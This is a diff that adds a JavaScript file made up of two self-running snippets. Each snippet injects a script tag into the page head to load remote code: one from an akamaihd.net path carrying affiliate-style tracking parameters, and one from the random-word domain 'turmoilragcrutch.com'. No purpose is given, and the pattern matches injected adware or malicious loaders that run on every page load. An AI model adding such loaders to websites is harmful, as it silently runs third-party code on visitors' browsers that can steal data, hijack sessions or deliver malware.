@@ -1,0 +1,14 @@
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//cdncache-a.akamaihd.net/sub/qbc5245/gyourp/l.js?pid=2700&ext=WGX&rvz_subid=2001-1001';
+    head.appendChild(script);
+})();
+(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//turmoilragcrutch.com/ea/a9/4a/eaa94ab6abeca61c46a04e298d67468d.js';
+    head.appendChild(script);
+})();
